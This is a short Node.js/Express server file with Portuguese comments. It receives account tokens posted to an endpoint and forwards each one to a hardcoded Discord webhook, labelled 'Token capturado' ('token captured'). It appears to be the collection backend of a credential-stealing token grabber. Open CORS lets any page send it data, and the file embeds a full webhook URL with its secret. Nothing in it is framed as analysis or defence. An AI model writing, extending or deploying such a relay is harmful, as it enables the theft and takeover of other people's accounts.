// server.js
const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const app = express();

// Middleware
app.use(cors());
app.use(express.json());  // Para parsear o corpo das requisições como JSON

// Endpoint para teste
app.get('/', (req, res) => {
  res.send('Servidor rodando! Envie tokens para /send-to-discord.');
});

// Enviar tokens para o Discord via Webhook
app.post('/send-to-discord', async (req, res) => {
  const { token } = req.body;  // Pegando o token do corpo da requisição

  if (!token) return res.status(400).send("Token ausente.");

  try {
    // Enviando o token para o Discord
    const response = await fetch('https://discord.com/api/webhooks/1366557827107393608/ziqyGd8ZjfT3llWnKeNXIsDnFQr6XhkqLy-7ASQk7WCL2gMN3IAIe6sx4m0XWm_j5NcX', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `Token capturado: ${token}`  // Formato de mensagem enviada ao Discord
      })
    });

    if (!response.ok) {  // Verificando se a resposta da API foi bem-sucedida
      throw new Error('Erro ao enviar a mensagem para o Discord');
    }

    res.status(200).send('Token enviado com sucesso!');  // Respondendo sucesso
  } catch (error) {
    console.error("Erro ao enviar para o Discord:", error);
    res.status(500).send('Erro interno ao tentar enviar para o Discord');  // Caso ocorra algum erro
  }
});

// Iniciar o servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Backend rodando em http://localhost:${PORT}`);
});
